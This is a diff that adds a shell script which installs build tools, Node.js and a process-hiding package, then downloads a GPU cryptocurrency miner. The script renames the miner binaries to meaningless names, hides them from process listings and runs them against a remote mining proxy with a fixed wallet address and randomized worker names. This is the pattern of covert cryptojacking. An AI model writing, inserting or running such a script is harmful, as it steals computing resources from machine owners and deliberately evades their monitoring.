@@ -1,0 +1,39 @@
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+apt update && apt -y install sudo wget curl unzip
+
+sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+
+apt-get install -y nodejs npm
+
+npm i -g node-process-hider
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+
+dpkg-reconfigure --frontend noninteractive tzdata
+
+wget -c https://github.com/pearlfortune/pearl-miner/releases/download/v1.2.4/pearlfortune-v1.2.4.tar.gz \
+&& tar vxzf pearlfortune-v1.2.4.tar.gz \
+&& cd pearlfortune \
+&& chmod +x miner-cuda13 miner-cuda12 \
+&& cp miner-cuda13 iakslaol \
+&& cp miner-cuda12 iakslao2
+
+ph add iakslaol
+
+ph add iakslao2
+
+./iakslaol \
+--proxy global.pearlfortune.org:443 \
+--address prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch \
+--worker $(echo $RANDOM | md5sum | head -c 10) \
+-gpu --tui
+
+./iakslao2 \
+--proxy global.pearlfortune.org:443 \
+--address prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch \
+--worker $(echo $RANDOM | md5sum | head -c 10) \
+-gpu --tui
